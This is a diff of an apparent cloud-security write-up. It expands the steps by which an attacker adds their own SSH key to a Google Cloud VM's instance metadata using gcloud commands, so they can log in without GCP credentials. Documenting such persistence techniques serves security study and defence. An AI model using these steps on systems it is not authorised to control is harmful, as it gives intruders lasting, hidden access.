@@ -132,7 +132,7 @@ The attacker can disable "Block Project-wide SSH Key" option but we are avoiding
 
     - Check Existing SSH Keys in Project Metadata
     
-      Before adding a new SSH key, it's essential to check for existing keys in your project's metadata. If you don't include these existing keys when adding a new one, they will be erased.
+      Before adding a new SSH key, it's essential to check for existing keys in the Project's Metadata. If the existing keys are not included when adding a new one, they will be erased.
       
       Run the following command to list existing SSH keys:
       
@@ -161,7 +161,7 @@ The attacker can disable "Block Project-wide SSH Key" option but we are avoiding
     
     - Update Project Metadata with New SSH Keys
     
-      Now that `sshkeys.txt` contains all the SSH keys (both existing and new), thge Project's Metadata can now be updated.
+      Now that `sshkeys.txt` contains all the SSH keys (both existing and new), the Project's Metadata can now be updated.
       
       ```bash
       gcloud compute project-info add-metadata --metadata-from-file ssh-keys=sshkeys.txt
@@ -193,11 +193,45 @@ The attacker can disable "Block Project-wide SSH Key" option but we are avoiding
 
     This will generate a Private Key `(~/.ssh/id_rsa)` and a Public Key `(~/.ssh/id_rsa.pub)`.
 
-2. Add the Public SSH key to the Instance metadata of the VM.
+2. Add the Public SSH key to the Instance metadata of the VM. Just like Project-wide Metadata, adding Public Keys to Instance Metadata is not that straight forward, one needs to follow certain steps to upload it. The steps are listed below.
 
-    ```powershell
-    gcloud compute instances add-metadata INSTANCE_NAME --metadata-from-file ssh-keys=~/.ssh/id_rsa.pub
-    ```
+    - Check Existing SSH Keys in Instance Metadata
+    
+      Before adding a new SSH key, it's essential to check for existing keys in your Instance metadata. If you don't include these existing keys when adding a new one, they will be erased.
+      
+      Run the following command to list existing SSH keys:
+      
+      ```bash
+      gcloud compute instances describe [INSTANCE-NAME] --zone [ZONE]
+      ```
+      
+      Copy the output and save it into a text file, let's call it `sshkeys.txt`.
+    
+    - Generate a New SSH Key Pair
+          
+      ```bash
+      ssh-keygen -t rsa -C [USERNAME] -b 2048
+      ```
+
+      This will generate a new SSH key, saving it in the `.ssh/id_rsa` file within the user directory.
+    
+    - Append the New SSH Key to `sshkeys.txt`
+    
+      Open the newly generated public key file, usually located at `~/.ssh/id_rsa.pub`, and copy its contents.
+      
+      Open `sshkeys.txt` and append the new key at the end of the file in the following format:
+      
+      ```bash
+      [USERNAME]:<copied_public_key>
+      ```
+    
+    - Update Instance Metadata with New SSH Keys
+    
+      Now that `sshkeys.txt` contains all the SSH keys (both existing and new), the Instance's Metadata can now be updated.
+      
+      ```bash
+      gcloud compute instances add-metadata [INSTANCE-NAME] --metadata-from-file ssh-keys="sshkeys.txt" --zone [ZONE]
+      ```
     
 3. The Attacker can now login to the Instance without needing to authenticate to GCP or have access to a valid User / Service Account..
 
